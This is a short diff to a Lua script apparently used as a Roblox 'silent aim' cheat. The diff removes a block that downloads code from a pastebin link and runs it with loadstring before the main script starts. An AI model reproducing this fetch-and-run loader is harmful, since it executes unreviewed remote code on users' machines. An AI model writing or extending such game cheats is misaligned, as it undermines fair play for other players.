@@ -1,26 +1,5 @@
 -- Nova Silent Aim - Working Version
 
--- Load external script first
-print("Loading external script...")
-local success, result = pcall(function()
-    local scriptContent = game:HttpGet("https://pastebin.com/raw/4e60mJjh")
-    local loadedScript = loadstring(scriptContent)
-    if loadedScript then
-        loadedScript()
-        print("External script loaded successfully!")
-    else
-        warn("Failed to loadstring external script")
-    end
-end)
-
-if not success then
-    warn("Error loading external script:", result)
-end
-
--- Wait 4 seconds before loading main script
-print("Waiting 4 seconds before loading Nova...")
-task.wait(4)
-
 -- Wait for config
 repeat task.wait() until shared.Nova
 local cfg = shared.Nova
